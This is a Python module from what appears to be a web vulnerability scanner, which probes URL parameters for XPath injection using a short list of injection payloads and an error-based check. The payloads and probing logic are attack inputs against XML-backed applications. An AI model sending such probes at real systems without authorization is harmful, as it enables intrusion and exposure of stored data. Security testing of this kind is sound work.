import asyncio
from modules.core import console

# XPath Injection
# Similar to SQLi but for XML.
# Payloads break the query structure or use boolean logic.

XPATH_PAYLOADS = [
    "' or '1'='1",
    "'] | //user | ['",
    "' or count(parent::*)=1 or 'a'='b",
    "1' or 1=1 or 'a'='a",
]

async def check_xpath(session, url, param):
    try:
        # 1. Error Induction
        target_bad = f"{url}?{param}='"
        if "?" in url: target_bad = f"{url}&{param}='"
        
        async with session.get(target_bad, timeout=5, ssl=False) as resp:
            text = await resp.text()
            if "XPathException" in text or "xml" in text.lower() and "syntax" in text.lower():
                 return {
                    "url": target_bad,
                    "param": param,
                    "type": "XPath Injection (Error)",
                    "payload": "'",
                    "evidence": "XML/XPath Syntax Error"
                }

        # 2. Boolean Inference
        # Injects ' or '1'='1
        target_bool = f"{url}?{param}=' or '1'='1"
        if "?" in url: target_bool = f"{url}&{param}=' or '1'='1"
        
        async with session.get(target_bool, timeout=5, ssl=False) as resp:
            text = await resp.text()
            # If we get more results or different results compared to baseline (simplified here)
            # We look for "Admin" or generic success that shouldn't appear
            if "admin" in text.lower() or "success" in text.lower():
                 # Weak heuristic, but better than nothing
                 pass 

    except Exception:
        pass
    return None

async def scan_xpath(session, url):
    """
    Scan for XPath Injection (XML Database).
    """
    console.print(f"\n[bold cyan]--- XPath Injection Scanner ---[/bold cyan]")
    
    params = ["search", "query", "id", "xml", "cat"]
    
    tasks = [check_xpath(session, url, p) for p in params]
    results = await asyncio.gather(*tasks)
    
    found = []
    for res in results:
        if res:
             console.print(f"  [bold red][!] XPATH INJECTION DETECTED: {res['param']}[/bold red]")
             console.print(f"      Type: {res['type']}")
             found.append(res)
             
    if not found:
        console.print("[dim][-] No XPath injection indicators found.[/dim]")
        
    return found
